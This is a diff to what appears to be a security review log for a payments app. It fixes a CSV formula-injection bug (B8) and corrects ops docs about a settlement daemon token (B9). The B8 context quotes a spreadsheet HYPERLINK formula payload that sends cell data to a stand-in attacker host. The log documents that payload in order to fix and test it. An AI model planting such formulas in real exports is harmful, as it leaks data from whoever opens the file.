@@ -77,3 +77,11 @@
 - What it breaks: a merchant (or anyone who can set an order reference through the API) sets the reference to `=HYPERLINK("http://evil.example/?x="&A1,"Click")`. Finance downloads the export and opens it in Excel. The cell becomes a live link that can send other cells' data out, or other formulas can run. The attacker controls the data, and a trusted person opens it.
 - Fix: `csvEscape` puts a single quote in front of any text cell that starts with `= + - @`, tab or CR (OWASP guidance), and also quotes cells that contain a CR. Only text fields use `csvEscape`. The amount columns come from `formatBhd` and stay plain numbers (`12.345`). Normal references (`order-42`) do not change.
 - Test: apps/api/src/transactions/exportCsvInjection.fix.test.ts "B8: formula-like references are prefixed with a quote; amounts and normal references are unchanged".
+
+### B9 Ops docs say the settlement daemon falls back to `dev-token`
+- Severity: Low (docs) / Ticket: none / Where: ops/README.md:73, ops/docker-compose.yml:106
+- What is wrong: both say that when `SETTLEMENT_INTERNAL_TOKEN` is not set, the settlement daemon uses `dev-token`, so "nothing extra is needed" for local runs.
+- Why it happens: the comments were not updated when the code changed. `apps/settlement/internal/config/config.go` `RequireInternalToken` returns an error when the token is empty, and `cmd/settlement/main.go` calls it for `daemon` and exits. There is no fallback value anywhere in the Go code. FH's note in the compose file already said "it exits at boot without the token for me".
+- What it breaks: an operator trusts the doc, leaves the token out of a new environment, and the settlement daemon crash-loops at boot. Or they set the api to `dev-token` to "match", and the api's calls to settlement's internal API fail with 401.
+- Fix: the README table and the compose comment now say the token has no default, `daemon` exits without it, one-shot CLI commands do not need it, and it must match the api's value.
+- Test: none (docs only). Checked against `config.RequireInternalToken` and `main.go`.
